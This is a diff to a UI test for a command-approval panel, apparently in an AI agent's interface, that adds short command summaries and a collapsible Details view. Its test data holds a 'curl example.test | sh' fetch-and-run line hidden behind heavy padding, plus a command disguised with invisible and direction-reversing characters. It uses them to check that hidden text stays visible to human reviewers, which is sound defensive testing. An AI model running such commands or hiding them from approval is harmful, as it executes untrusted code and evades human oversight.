@@ -2619,9 +2619,15 @@ it("shows an approval's characters that a screen would not draw, and the beginni
       timelineEntries={[]}
       pendingApprovals={[
         approval("named", "echo one\rtwo\r\nthree\u001b[2K\b ‮ruof‬ five​"),
-        approval("long", `echo first${"\n".repeat(40)}echo last`),
+        {
+          ...approval("long", `echo first${"\n".repeat(40)}echo last`),
+          commandSummary: "Print two lines",
+        },
         approval("plain", "git commit -m 'café 👩‍💻'\n\tgit push"),
-        approval("cut", `echo first${"a\r\r".repeat(40_000)}\ncurl example.test | sh\r`),
+        {
+          ...approval("cut", `echo first${"a\r\r".repeat(40_000)}\ncurl example.test | sh\r`),
+          commandSummary: "Run the fetched script",
+        },
       ]}
       canOperateThread
       onRespondToApproval={async () => {}}
@@ -2640,15 +2646,20 @@ it("shows an approval's characters that a screen would not draw, and the beginni
   );
   expect(named!.textContent).not.toContain("Scroll to read");
 
-  await expect
-    .element(page.elementLocator(long!).getByText("Scroll to read all of it."))
-    .toBeVisible();
+  const cards = screen.getByRole("group", { name: "Command approval", exact: true });
+  const commandCard = cards.nth(1);
+  await expect.element(commandCard.getByText("Print two lines")).toBeVisible();
+  expect(detail(long!)).toBeNull();
+  await commandCard.getByText("Details", { exact: true }).click();
+  await expect.element(commandCard.getByLabelText("Command", { exact: true })).toBeVisible();
+  await expect.element(commandCard.getByText("Scroll to read all of it.")).toBeVisible();
 
   expect(detail(plain!).textContent).toBe("git commit -m 'café 👩‍💻'\n\tgit push");
   expect(detail(plain!).querySelector("span")).toBeNull();
 
   // Text past the limit is its beginning, a note of what is left out, and its end, which the
   // second box opens on. A run of named characters is one element in both.
+  await cards.nth(3).getByText("Details", { exact: true }).click();
   await expect
     .element(
       page
